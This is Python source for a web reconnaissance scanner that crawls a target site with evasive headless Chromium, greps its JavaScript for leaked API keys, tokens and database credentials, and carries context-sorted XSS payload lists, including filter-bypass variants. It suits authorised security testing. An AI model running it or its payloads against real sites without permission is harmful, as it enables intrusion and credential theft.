#!/usr/bin/env python3
"""
JS Scout Pro v5 — Selenium + Chromium Edition
==============================================
JavaScript security recon tool with real browser crawling.

Install deps:
    pip install requests selenium webdriver-manager

On Linux (Kali/Ubuntu):
    apt install chromium chromium-driver
    pip install selenium webdriver-manager

On Windows/Mac:
    pip install selenium webdriver-manager
    (chromedriver auto-downloaded via webdriver-manager)

Usage:
    python3 jsscout.py https://target.com
    python3 jsscout.py https://target.com --threads 10 --depth 4
    python3 jsscout.py https://target.com --no-selenium   # requests-only mode
    python3 server.py  ->  http://localhost:7331  (Web UI)
"""

import re, sys, os, json, time, hashlib, argparse, threading, traceback
from pathlib import Path
from queue import Queue, Empty
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from html.parser import HTMLParser

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

# Selenium — optional but strongly recommended
SELENIUM_OK = False
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import (
        TimeoutException, WebDriverException, NoSuchElementException,
        StaleElementReferenceException, JavascriptException
    )
    SELENIUM_OK = True
except ImportError:
    pass

# webdriver-manager for auto chromedriver download
WDM_OK = False
try:
    from webdriver_manager.chrome import ChromeDriverManager
    WDM_OK = True
except ImportError:
    pass


# =============================================================================
# SECURITY PATTERNS
# =============================================================================

SECRET_PATTERNS = [
    (re.compile(r'(?:api[_\-]?key|apikey|api_secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', re.I), "api_key", "HIGH"),
    (re.compile(r'(?:access[_\-]?token|auth[_\-]?token)\s*[:=]\s*["\']([a-zA-Z0-9_\-\.]{20,})["\']', re.I), "access_token", "HIGH"),
    (re.compile(r'["\']eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}["\']'), "jwt_token", "HIGH"),
    (re.compile(r'(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']{4,})["\']', re.I), "password", "CRITICAL"),
    (re.compile(r'(?:secret|client_secret|private_key)\s*[:=]\s*["\']([^"\']{8,})["\']', re.I), "secret", "HIGH"),
    (re.compile(r'(?:AKIA|ASIA)[A-Z0-9]{16}'), "aws_access_key", "CRITICAL"),
    (re.compile(r'AIza[a-zA-Z0-9_\-]{35}'), "google_api_key", "HIGH"),
    (re.compile(r'["\']pk_(?:test|live)_[a-zA-Z0-9]{24,}["\']'), "stripe_pk", "CRITICAL"),
    (re.compile(r'["\']sk_(?:test|live)_[a-zA-Z0-9]{24,}["\']'), "stripe_sk", "CRITICAL"),
    (re.compile(r'xox[baprs]-[0-9a-zA-Z\-]{10,}'), "slack_token", "HIGH"),
    (re.compile(r'gh[pousr]_[a-zA-Z0-9]{36,}'), "github_token", "HIGH"),
    (re.compile(r'-----BEGIN (?:RSA )?PRIVATE KEY-----'), "private_key", "CRITICAL"),
    (re.compile(r'(?:firebase|firebaseConfig)[^{]{0,50}apiKey\s*:\s*["\']([^"\']{10,})["\']', re.I), "firebase_key", "HIGH"),
    (re.compile(r'(?:mongodb|postgres|mysql|redis)://[^\s"\'<>]{10,}', re.I), "db_connection", "CRITICAL"),
    (re.compile(r'"type"\s*:\s*"service_account"'), "gcp_service_account", "CRITICAL"),
    (re.compile(r'(?:authorization|x-api-key)\s*:\s*["\']([^"\']{10,})["\']', re.I), "auth_header", "HIGH"),
]

ENDPOINT_PATTERNS = [
    re.compile(r'["\'`](/api/v?\d+/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`](/api/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`](/graphql[a-zA-Z0-9/_\-]*)["\'`]'),
    re.compile(r'["\'`](/rest/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`](/v[1-9]\d*/[a-zA-Z0-9/_\-\.{}:]+)["\'`]'),
    re.compile(r'["\'`]([a-zA-Z0-9/_\-\.{}:]+\.(?:json|xml|yaml))["\'`]'),
    re.compile(r'(?:fetch|axios\.(?:get|post|put|delete|patch)|xhr\.open)\s*\(\s*["\']([^"\']+)["\']', re.I),
    re.compile(r'(?:url|endpoint|baseURL|apiUrl|API_URL)\s*[:=]\s*["\'`]([^"\'`]{5,100})["\'`]', re.I),
]

XSS_SINKS = [
    (re.compile(r'\.innerHTML\s*=\s*(?!["\'\s]*["\']|`[^`$]*`\s*;|\s*(?:""|\'\'|``)\s*)', re.I), "innerHTML", "HIGH"),
    (re.compile(r'\.outerHTML\s*=\s*', re.I), "outerHTML", "HIGH"),
    (re.compile(r'document\.write\s*\(', re.I), "document.write", "HIGH"),
    (re.compile(r'document\.writeln\s*\(', re.I), "document.writeln", "HIGH"),
    (re.compile(r'\.insertAdjacentHTML\s*\(', re.I), "insertAdjacentHTML", "CRITICAL"),
    (re.compile(r'(?<!\.)(?<!typeof\s)\beval\s*\(', re.I), "eval", "CRITICAL"),
    (re.compile(r'\bnew\s+Function\s*\(', re.I), "new Function()", "CRITICAL"),
    (re.compile(r'setTimeout\s*\(\s*(?:["\']|[a-zA-Z_$][a-zA-Z0-9_$]*\s*\+)', re.I), "setTimeout(str)", "HIGH"),
    (re.compile(r'setInterval\s*\(\s*(?:["\']|[a-zA-Z_$][a-zA-Z0-9_$]*\s*\+)', re.I), "setInterval(str)", "HIGH"),
    (re.compile(r'window\.location(?:\.href)?\s*=\s*(?!["\'](?:#|/|https?:)[^"\']*["\'])', re.I), "location.href=", "HIGH"),
    (re.compile(r'location\.(?:replace|assign)\s*\(', re.I), "location.replace/assign", "HIGH"),
    (re.compile(r'\$\([^)]+\)\.html\s*\(\s*(?!\s*\))[^"\'`)]', re.I), "$.html()", "HIGH"),
    (re.compile(r'\$\([^)]+\)\.(?:append|prepend|after|before)\s*\(\s*(?!\s*["\']<[^<]*>["\'])', re.I), "$.append/prepend", "MEDIUM"),
    (re.compile(r'\.attr\s*\(\s*["\'`](?:href|src|action)["\'`]\s*,', re.I), "$.attr(href/src)", "HIGH"),
    (re.compile(r'dangerouslySetInnerHTML\s*=', re.I), "dangerouslySetInnerHTML", "CRITICAL"),
    (re.compile(r'\.srcdoc\s*=', re.I), "iframe.srcdoc", "HIGH"),
    (re.compile(r'createContextualFragment\s*\(', re.I), "createContextualFragment", "CRITICAL"),
    (re.compile(r'addEventListener\s*\(\s*["\'`]message["\'`]', re.I), "postMessage listener", "MEDIUM"),
    (re.compile(r'\.setAttributeNS?\s*\(\s*(?:null,\s*)?["\'`](?:href|src|action)["\'`]', re.I), "setAttribute(href/src)", "HIGH"),
]

XSS_SOURCES = [
    (re.compile(r'location\.(?:search|hash|href|pathname)', re.I), "location.*"),
    (re.compile(r'document\.(?:URL|documentURI|referrer)', re.I), "document.URL"),
    (re.compile(r'(?:URLSearchParams|searchParams)\.(?:get|getAll)\s*\(', re.I), "URLSearchParams"),
    (re.compile(r'document\.getElementById\([^)]+\)\.value', re.I), "DOM input value"),
    (re.compile(r'document\.querySelector\([^)]+\)\.value', re.I), "DOM input value"),
    (re.compile(r'window\.name', re.I), "window.name"),
    (re.compile(r'document\.cookie', re.I), "document.cookie"),
    (re.compile(r'postMessage', re.I), "postMessage"),
]

XSS_SANITIZERS = [
    'DOMPurify.sanitize', 'sanitizeHtml', 'sanitize_html', 'escapeHtml',
    'escape_html', 'bleach.clean', 'he.encode', 'he.escape',
    'createTextNode', 'innerText', 'encodeURIComponent', 'htmlspecialchars',
    'htmlentities', 'stripTags', 'xss(', 'filterXSS',
]

KEYWORDS = {
    'todo_fixme':    re.compile(r'\b(?:TODO|FIXME|HACK|XXX|BUG|TEMP)\b'),
    'debug_logging': re.compile(r'\bconsole\.(log|debug|warn|error|info)\s*\(', re.I),
    'hardcoded_url': re.compile(r'https?://(?:localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+)'),
    'disabled_security': re.compile(r'(?:verify\s*=\s*False|SSL_VERIFY|checkServerIdentity|rejectUnauthorized\s*:\s*false)', re.I),
    'cors_wildcard': re.compile(r'Access-Control-Allow-Origin["\s:]+\*'),
    'admin_path':    re.compile(r'["\'`]/(?:admin|administrator|wp-admin|manage|dashboard|control)[/"\'`]', re.I),
    'jwt_nosig':     re.compile(r'algorithm[s]?\s*[=:]\s*["\'](?:none|NONE)["\']'),
}

XSS_PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>",
        '"><script>alert(1)</script>',
    ],
    "attribute": [
        '" onmouseover=alert(1) x="',
        "' onmouseover=alert(1) x='",
        '" autofocus onfocus=alert(1) x="',
        "' autofocus onfocus=alert(1) x='",
    ],
    "javascript_context": [
        '";alert(1)//',
        "';alert(1)//",
        "`;alert(1)//",
        '\\";alert(1)//',
        "</script><script>alert(1)</script>",
    ],
    "href_src": [
        "javascript:alert(1)",
        "javascript:alert`1`",
        "data:text/html,<script>alert(1)</script>",
    ],
    "filter_bypass": [
        "<sCript>alert(1)</sCript>",
        "<img/src=x/onerror=alert(1)>",
        "<svg/onload=alert(1)//>",
        "<audio src onerror=alert(1)>",
        "<img src=x onerror=alert`1`>",
    ],
    "dom": [
        "javascript:alert(1)",
        "#<img src=x onerror=alert(1)>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    ],
}

# Context-aware payloads — used by the XSS prober
# Key = reflection context detected in the page
CONTEXT_PAYLOADS = {
    'html': [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<script>alert(1)</script>',
        '<body onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
    ],
    'attr': [
        '" onmouseover=alert(1) x="',
        "' onmouseover=alert(1) x='",
        '" autofocus onfocus=alert(1) x="',
        '" onblur=alert(1) x="',
    ],
    'attr_href': [
        'javascript:alert(1)',
        'javascript:alert`1`',
        'JaVaScRiPt:alert(1)',
    ],
    'attr_src': [
        'x onerror=alert(1)',
        'x" onerror="alert(1)',
    ],
    'js_str_dq': [
        '";alert(1)//',
        '";alert(1);x="',
        '\\";alert(1)//',
        '"+(alert(1))+"',
    ],
    'js_str_sq': [
        "';alert(1)//",
        "';alert(1);x='",
        "\\';alert(1)//",
        "'+(alert(1))+'",
    ],
    'js_str_bt': [
        '`;alert(1)//',
        '${alert(1)}',
        '`+(alert(1))+`',
    ],
    'js_comment': [
        '\nalert(1)\n//',
        '\nalert(1)/*',
    ],
    'url': [
        'javascript:alert(1)',
        '%22><img src=x onerror=alert(1)>',
        '"><img src=x onerror=alert(1)>',
    ],
    'unknown': [
        '<img src=x onerror=alert(1)>',
        '" onmouseover=alert(1) x="',
        "';alert(1)//",
        '";alert(1)//',
        'javascript:alert(1)',
        '"><img src=x onerror=alert(1)>',
    ],
}

# =============================================================================
# JS URL EXTRACTION — comprehensive, handles webpack/vite/AMD/chunks
# =============================================================================

SKIP_EXTS = {
    '.css','.png','.jpg','.jpeg','.gif','.svg','.ico',
    '.woff','.woff2','.ttf','.eot','.otf',
    '.pdf','.zip','.gz','.tar','.rar',
    '.mp4','.mp3','.webm','.ogg','.wav',
    '.webp','.avif','.bmp','.map',
}

MANIFEST_PATHS = [
    '/asset-manifest.json', '/static/asset-manifest.json',
    '/assets/asset-manifest.json', '/manifest.json',
    '/webpack-manifest.json', '/mix-manifest.json',
    '/assets.json', '/precache-manifest.js',
    '/_next/static/development/_buildManifest.js',
    '/service-worker.js', '/sw.js',
]

# Basic patterns: quoted JS references
JS_REGEXES = [
    re.compile(r'src\s*=\s*["\']([^"\']+\.m?js(?:\?[^"\']*)?)["\']', re.I),
    re.compile(r'src\s*=\s*([^\s"\'>/]+\.m?js(?:\?[^\s"\'>/]*)?)', re.I),
    re.compile(r'(?:import|require)\s*\(\s*["\'`]([^"\'`]+\.m?js(?:\?[^"\'`]*)?)["\'`]\s*\)', re.I),
    re.compile(r'import\s+[^"\'`]*["\'`]([^"\'`]+\.m?js)["\'`]', re.I),
    re.compile(r'["\'`](https?://[^\s"\'`<>]+\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    re.compile(r'["\'`](/_next/static/[^\s"\'`<>]+\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    re.compile(r'["\'`](/(?:assets|static/js|static/chunks|dist|build|js)/[a-zA-Z0-9._/\-]+\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    re.compile(r'["\'`](/[a-zA-Z0-9._/\-]{4,300}\.m?js(?:\?[^\s"\'`<>]*)?)["\'`]'),
    re.compile(r'https?://[^\s"\'<>]+\.m?js(?:\?[^\s"\'<>]*)?(?=[\s,;>])'),
    re.compile(r'data-(?:src|main)\s*=\s*["\']([^"\']+\.m?js)["\']', re.I),
    # RequireJS / AMD
    re.compile(r'require\s*\(\s*\[([^\]]+)\]', re.I),
    re.compile(r'define\s*\(\s*\[([^\]]+)\]', re.I),
]

# Webpack patterns
_WP_PUBPATH    = re.compile(r'__webpack_require__\.p\s*=\s*["\'`]([^"\'`]+)["\'`]')
_WP_PUBPATH2   = re.compile(r'publicPath\s*[=:]\s*["\'`]([^"\'`]{1,100})["\'`]')

# Webpack 4: {0:"abc123", 1:"def456"} — chunk id to hash
_WP4_CHUNK_MAP = re.compile(r'\{(?:\s*\d+\s*:\s*"[a-f0-9]{4,}"(?:\s*,\s*\d+\s*:\s*"[a-f0-9]{4,}")*\s*)\}')
_WP4_CHUNK_ID  = re.compile(r'(\d+)\s*:\s*"([a-f0-9]{4,})"')

# Webpack 4 named: {0:"home", 1:"about"} — chunk id to name (no hash)
_WP4_NAMED_MAP = re.compile(r'\{(?:\s*\d+\s*:\s*"[a-zA-Z0-9_\-\.]+"(?:\s*,\s*\d+\s*:\s*"[a-zA-Z0-9_\-\.]+")*\s*)\}')
_WP4_NAMED_ID  = re.compile(r'(\d+)\s*:\s*"([a-zA-Z0-9_\-\.]+)"')

# Webpack 5: (self["webpackChunk..."] = self["webpackChunk..."] || []).push
_WP5_CHUNK     = re.compile(r'self\[["\'`]webpackChunk[^"\'`]*["\'`]\]')

# Webpack chunk filename template: e => e + ".js" or e + ".chunk.js"
_WP_CHUNK_TMPL = re.compile(r'function\s*\w*\s*\(\s*\w+\s*\)\s*\{\s*return\s*\w+\s*\+\s*["\']([^"\']+)["\']')
_WP_CHUNK_EXT  = re.compile(r'\.push\(\[(\d+)\]\)')

# Next.js
_NEXT_BUILD    = re.compile(r'"buildId"\s*:\s*"([a-zA-Z0-9_\-]{4,})"')

# Vite: dynamic import("/assets/Name.hash.js")
_VITE_IMPORT   = re.compile(r'import\s*\(\s*["\']([^"\']+\.m?js)["\']')
_VITE_ENTRY    = re.compile(r'"([a-zA-Z0-9/_\-\.]+\.m?js)"\s*:')

# AMD require array strings: require(["./a","./b"])
_AMD_DEPS      = re.compile(r'["\'](\./[a-zA-Z0-9/_\-\.]+)["\']')


def extract_js_urls(content: str, base_url: str) -> set:
    """
    Extract ALL JS URLs from HTML or JS content.
    Handles: plain src/import/require, Webpack 4+5, Next.js, Vite, AMD/RequireJS.
    """
    found = set()
    parsed_base = urlparse(base_url)
    origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

    def add(raw: str):
        if not raw or raw.startswith(('data:', 'blob:')):
            return
        raw = raw.strip().split('#')[0]
        if raw.startswith('//'):
            raw = parsed_base.scheme + ':' + raw
        elif not raw.startswith('http'):
            raw = urljoin(base_url, raw)
        if raw.startswith(('http://', 'https://')):
            found.add(raw)

    # ── Basic regex sweep ────────────────────────────────────────────────────
    for pat in JS_REGEXES:
        for m in pat.finditer(content):
            group = m.group(1) if m.lastindex else m.group(0)
            # AMD array: extract each quoted path from ["a","b","c"]
            if group.startswith('[') or ',' in group:
                for dep in _AMD_DEPS.findall(group):
                    if dep.endswith('.js') or '/' in dep:
                        add(dep)
            else:
                add(group)

    # ── Detect publicPath ────────────────────────────────────────────────────
    pub_path = '/'
    for pat in [_WP_PUBPATH, _WP_PUBPATH2]:
        m = pat.search(content)
        if m:
            pp = m.group(1).strip()
            if pp.startswith('/') or pp.startswith('http'):
                pub_path = pp if pp.startswith('http') else origin + pp
                break

    pub_base = pub_path.rstrip('/')

    # ── Webpack 4: hash chunk maps  {0:"abc123", 1:"def456"} ────────────────
    chunk_tmpl = '.chunk.js'  # default
    tmpl_m = _WP_CHUNK_TMPL.search(content)
    if tmpl_m:
        chunk_tmpl = tmpl_m.group(1)  # e.g. ".chunk.js" or ".js"

    for cm in _WP4_CHUNK_MAP.finditer(content):
        for m in _WP4_CHUNK_ID.finditer(cm.group(0)):
            cid, chash = m.group(1), m.group(2)
            for tmpl in [
                f'/static/js/{cid}.{chash}.chunk.js',
                f'/static/js/{cid}.{chash}.js',
                f'/static/chunks/{cid}.{chash}.js',
                f'/js/{cid}.{chash}.chunk.js',
                f'/_next/static/chunks/{cid}-{chash}.js',
                f'/{cid}.{chash}{chunk_tmpl}',
            ]:
                add(pub_base + tmpl if not pub_base.startswith('http') else pub_base + tmpl)

    # ── Webpack 4: named chunk maps {0:"home", 1:"about"} ───────────────────
    for cm in _WP4_NAMED_MAP.finditer(content):
        for m in _WP4_NAMED_ID.finditer(cm.group(0)):
            cid, cname = m.group(1), m.group(2)
            # Skip if looks like a hash (already caught above)
            if re.match(r'^[a-f0-9]{6,}$', cname):
                continue
            for tmpl in [
                f'/static/js/{cname}.{cid}.chunk.js',
                f'/static/js/{cid}.{cname}.chunk.js',
                f'/static/chunks/{cname}.js',
                f'/js/{cname}.js',
                f'/{cid}.{cname}.js',
            ]:
                add(pub_base + tmpl)

    # ── Next.js build ID ─────────────────────────────────────────────────────
    nm = _NEXT_BUILD.search(content)
    if nm:
        bid = nm.group(1)
        for path in [
            f'/_next/static/{bid}/_buildManifest.js',
            f'/_next/static/{bid}/_ssgManifest.js',
            '/_next/static/chunks/main.js',
            '/_next/static/chunks/webpack.js',
            '/_next/static/chunks/framework.js',
            '/_next/static/chunks/pages/_app.js',
        ]:
            add(origin + path)

    # ── Vite dynamic imports ─────────────────────────────────────────────────
    for m in _VITE_IMPORT.finditer(content):
        add(m.group(1))
    for m in _VITE_ENTRY.finditer(content):
        path = m.group(1)
        if not path.startswith('/'):
            path = '/' + path
        add(urljoin(base_url, path))

    return found


# =============================================================================
# REFLECTION CONTEXT DETECTION
# =============================================================================

def detect_reflection_context(html: str, marker: str) -> list:
    """
    Find every position where marker appears in html/JS.
    For each, determine the syntactic context so we can pick the right payload.

    Returns list of context strings (may have multiple if reflected in several places):
        'html'        — raw HTML body between tags
        'attr'        — inside an HTML attribute value (generic)
        'attr_href'   — inside href/src/action/formaction attribute
        'attr_src'    — inside src/data/background attribute
        'js_str_dq'   — inside JS double-quoted string
        'js_str_sq'   — inside JS single-quoted string
        'js_str_bt'   — inside JS template literal
        'js_comment'  — inside // or /* comment
        'url'         — inside a URL value
        'unknown'     — can't determine
    """
    contexts = []
    start = 0

    while True:
        pos = html.find(marker, start)
        if pos == -1:
            break
        start = pos + 1

        # Look at surrounding ~300 chars on each side
        before = html[max(0, pos - 300):pos]
        after  = html[pos:min(len(html), pos + 300)]

        ctx = _classify_context(before, after, marker)
        if ctx not in contexts:
            contexts.append(ctx)

    return contexts if contexts else ['unknown']


def _classify_context(before: str, after: str, marker: str) -> str:
    """Classify the HTML/JS context based on surrounding text."""

    before_lower = before.lower()

    # ── Check if inside a <script> block ────────────────────────────────────
    last_script_open  = before_lower.rfind('<script')
    last_script_close = before_lower.rfind('</script')
    in_script = last_script_open > last_script_close and last_script_open != -1

    if in_script:
        # What kind of JS string context?
        # Count unescaped quotes after last newline or semicolon
        code_segment = before[last_script_open:]

        # Track quote state (simplistic but effective for most cases)
        dq = code_segment.count('"') - code_segment.count('\\"')
        sq = code_segment.count("'") - code_segment.count("\\'")
        bt = code_segment.count('`') - code_segment.count('\\`')

        # Check for comment
        last_line = code_segment.split('\n')[-1]
        if '//' in last_line and last_line.index('//') < len(last_line) - 2:
            return 'js_comment'
        if '/*' in code_segment and '*/' not in code_segment[code_segment.rfind('/*'):]:
            return 'js_comment'

        if dq % 2 == 1:
            return 'js_str_dq'
        if sq % 2 == 1:
            return 'js_str_sq'
        if bt % 2 == 1:
            return 'js_str_bt'

        return 'js_str_dq'  # fallback: assume double-quoted

    # ── Check if inside an HTML attribute ───────────────────────────────────
    # Find the last unclosed tag
    last_tag_open  = before.rfind('<')
    last_tag_close = before.rfind('>')
    in_tag = last_tag_open > last_tag_close and last_tag_open != -1

    if in_tag:
        tag_content = before[last_tag_open:]

        # Identify the attribute name
        attr_match = re.search(
            r'(href|src|action|formaction|data|background|poster|code)\s*=\s*["\']?$',
            tag_content, re.I
        )
        if attr_match:
            attr_name = attr_match.group(1).lower()
            if attr_name in ('href', 'action', 'formaction'):
                return 'attr_href'
            if attr_name in ('src', 'data', 'background', 'poster', 'code'):
                return 'attr_src'

        return 'attr'

    # ── Check if inside a URL value ──────────────────────────────────────────
    url_indicators = ['url(', 'href=', 'src=', 'action=', 'redirect=', 'next=', 'return=']
    if any(ind in before_lower[-100:] for ind in url_indicators):
        return 'url'

    # ── Default: raw HTML ────────────────────────────────────────────────────
    return 'html'


# =============================================================================
# HTML PARSERS
# =============================================================================

class PageParser(HTMLParser):
    """Extracts JS URLs, page links, inline scripts from HTML."""

    def __init__(self, base_url: str):
        super().__init__(convert_charrefs=True)
        self.base_url       = base_url
        self.base_domain    = urlparse(base_url).netloc
        self.js_urls        : set  = set()
        self.page_links     : set  = set()
        self.inline_scripts : list = []
        self._in_script     = False
        self._script_buf    = []

    def handle_starttag(self, tag: str, attrs):
        a = {k.lower(): (v or '') for k, v in attrs}

        if tag == 'script':
            self._in_script = True
            self._script_buf = []
            src = a.get('src', '').strip()
            if src:
                url = self._abs(src)
                if url:
                    self.js_urls.add(url)

        elif tag == 'link':
            href = a.get('href', '').strip()
            rel  = a.get('rel', '').lower()
            as_  = a.get('as', '').lower()
            if href:
                url = self._abs(href)
                if url:
                    is_js = href.endswith(('.js', '.mjs')) or '.js?' in href
                    if 'modulepreload' in rel or ('preload' in rel and as_ == 'script') or is_js:
                        self.js_urls.add(url)

        elif tag == 'a':
            href = a.get('href', '').strip()
            if href and not href.startswith(('mailto:', 'tel:', 'javascript:', '#', 'data:')):
                url = self._abs(href)
                if url and self._same_domain(url):
                    clean = url.split('#')[0].rstrip('/')
                    if clean:
                        self.page_links.add(clean)

    def handle_endtag(self, tag: str):
        if tag == 'script':
            self._in_script = False
            body = ''.join(self._script_buf).strip()
            if body:
                self.inline_scripts.append(body)
            self._script_buf = []

    def handle_data(self, data: str):
        if self._in_script:
            self._script_buf.append(data)

    def _abs(self, url: str) -> str:
        if not url:
            return ''
        try:
            result = urljoin(self.base_url, url.strip())
            if result.startswith(('http://', 'https://')):
                return result
        except Exception:
            pass
        return ''

    def _same_domain(self, url: str) -> bool:
        try:
            nl = urlparse(url).netloc
            return nl == self.base_domain or nl.endswith('.' + self.base_domain)
        except Exception:
            return False


class FormParser(HTMLParser):
    """
    Proper HTMLParser-based form extractor.
    Collects all forms, their fields, action, method.
    Also collects <a href> params and <button> names.
    """

    def __init__(self, base_url: str):
        super().__init__(convert_charrefs=True)
        self.base_url    = base_url
        self.base_domain = urlparse(base_url).netloc
        self.forms       : list = []
        self.href_params : dict = {}   # base_url -> set of param names
        self._cur_form   = None

    def handle_starttag(self, tag: str, attrs):
        a = {k.lower(): (v or '') for k, v in attrs}

        if tag == 'form':
            action = urljoin(self.base_url, a.get('action', '') or self.base_url)
            method = a.get('method', 'GET').upper()
            self._cur_form = {
                'action': action,
                'method': method,
                'fields': [],
            }

        elif tag in ('input', 'textarea', 'select', 'button') and self._cur_form is not None:
            name  = a.get('name', '').strip()
            ftype = a.get('type', 'text').lower()
            value = a.get('value', '')
            if name and ftype not in ('submit', 'reset', 'image', 'button'):
                self._cur_form['fields'].append({
                    'name':  name,
                    'type':  ftype,
                    'value': value,
                })

        elif tag == 'a':
            href = a.get('href', '').strip()
            if href and not href.startswith(('javascript:', 'mailto:', '#')):
                try:
                    full   = urljoin(self.base_url, href)
                    parsed = urlparse(full)
                    if parsed.netloc == self.base_domain or not parsed.netloc:
                        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        params = list(parse_qs(parsed.query).keys())
                        if params:
                            if base not in self.href_params:
                                self.href_params[base] = set()
                            self.href_params[base].update(params)
                except Exception:
                    pass

    def handle_endtag(self, tag: str):
        if tag == 'form' and self._cur_form is not None:
            # Only keep same-domain forms
            parsed = urlparse(self._cur_form['action'])
            if not parsed.netloc or parsed.netloc == self.base_domain:
                self.forms.append(self._cur_form)
            self._cur_form = None


# =============================================================================
# SELENIUM BROWSER MANAGER
# =============================================================================

class BrowserManager:
    """
    Manages a headless Chromium instance via Selenium.
    Provides JS-rendered page fetching, network request interception,
    and XSS payload injection.
    """

    def __init__(self, timeout: int = 15, log_fn=None):
        self.timeout = timeout
        self.log     = log_fn or print
        self.driver  = None
        self._lock   = threading.Lock()

    def start(self) -> bool:
        """Launch headless Chromium. Returns True on success."""
        if not SELENIUM_OK:
            self.log("[!] Selenium not installed — browser mode disabled")
            self.log("    pip install selenium webdriver-manager")
            return False

        opts = ChromeOptions()
        opts.add_argument('--headless=new')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--disable-web-security')
        opts.add_argument('--allow-running-insecure-content')
        opts.add_argument('--ignore-certificate-errors')
        opts.add_argument('--disable-blink-features=AutomationControlled')
        opts.add_argument('--window-size=1920,1080')
        opts.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36')
        opts.add_experimental_option('excludeSwitches', ['enable-automation'])
        opts.add_experimental_option('useAutomationExtension', False)

        # Enable performance logging to capture network requests
        opts.set_capability('goog:loggingPrefs', {'performance': 'ALL'})

        try:
            # Try system chromedriver first
            try:
                service = ChromeService()
                self.driver = webdriver.Chrome(service=service, options=opts)
                self.log("[+] Chromium started (system chromedriver)")
                return True
            except Exception:
                pass

            # Try webdriver-manager auto-download
            if WDM_OK:
                service = ChromeService(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=opts)
                self.log("[+] Chromium started (webdriver-manager)")
                return True

            # Try common paths
            for path in ['/usr/bin/chromedriver', '/usr/local/bin/chromedriver',
                         'chromedriver.exe', '/snap/bin/chromium.chromedriver']:
                if os.path.exists(path):
                    service = ChromeService(executable_path=path)
                    self.driver = webdriver.Chrome(service=service, options=opts)
                    self.log(f"[+] Chromium started ({path})")
                    return True

            self.log("[!] chromedriver not found. Install: apt install chromium-driver")
            return False

        except Exception as e:
            self.log(f"[!] Failed to start Chromium: {e}")
            return False

    def stop(self):
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None

    def get_page(self, url: str, wait_for_js: bool = True) -> dict:
        """
        Load URL in browser. Returns:
        {
            'html'          : str,      # final rendered HTML
            'js_urls'       : set,      # all JS URLs loaded by browser
            'page_links'    : set,      # all href links found
            'xhr_urls'      : set,      # XHR/fetch requests made
            'inline_scripts': list,     # inline script bodies
            'title'         : str,
            'final_url'     : str,
        }
        """
        if not self.driver:
            return {}

        result = {
            'html': '', 'js_urls': set(), 'page_links': set(),
            'xhr_urls': set(), 'inline_scripts': [], 'title': '', 'final_url': url
        }

        try:
            self.driver.set_page_load_timeout(self.timeout)
            self.driver.get(url)

            # Wait for page to stabilize
            if wait_for_js:
                try:
                    WebDriverWait(self.driver, min(self.timeout, 8)).until(
                        lambda d: d.execute_script('return document.readyState') == 'complete'
                    )
                    time.sleep(0.8)  # Extra wait for async JS
                except TimeoutException:
                    pass

            result['final_url'] = self.driver.current_url
            result['title']     = self.driver.title
            result['html']      = self.driver.page_source

            # ── Extract all loaded JS files from performance log ─────────────
            try:
                logs = self.driver.get_log('performance')
                for entry in logs:
                    try:
                        msg  = json.loads(entry['message'])['message']
                        meth = msg.get('method', '')
                        if meth == 'Network.requestWillBeSent':
                            req_url  = msg['params']['request']['url']
                            req_type = msg['params'].get('type', '')
                            if req_type == 'Script' or req_url.endswith(('.js', '.mjs')):
                                result['js_urls'].add(req_url)
                            elif req_type in ('XHR', 'Fetch'):
                                result['xhr_urls'].add(req_url)
                    except Exception:
                        pass
            except Exception:
                pass

            # ── Get all script src from DOM ───────────────────────────────────
            try:
                scripts = self.driver.find_elements(By.TAG_NAME, 'script')
                for s in scripts:
                    try:
                        src = s.get_attribute('src')
                        if src and src.startswith('http'):
                            result['js_urls'].add(src)
                        txt = s.get_attribute('innerHTML') or ''
                        if txt.strip():
                            result['inline_scripts'].append(txt)
                    except StaleElementReferenceException:
                        pass
            except Exception:
                pass

            # ── Get all links from DOM ────────────────────────────────────────
            try:
                links = self.driver.find_elements(By.TAG_NAME, 'a')
                base_domain = urlparse(url).netloc
                for link in links:
                    try:
                        href = link.get_attribute('href') or ''
                        if href.startswith('http'):
                            p = urlparse(href)
                            if p.netloc == base_domain or p.netloc.endswith('.' + base_domain):
                                result['page_links'].add(href.split('#')[0])
                    except StaleElementReferenceException:
                        pass
            except Exception:
                pass

            return result

        except WebDriverException as e:
            if 'net::ERR' not in str(e):
                pass  # silently ignore network errors
            return result
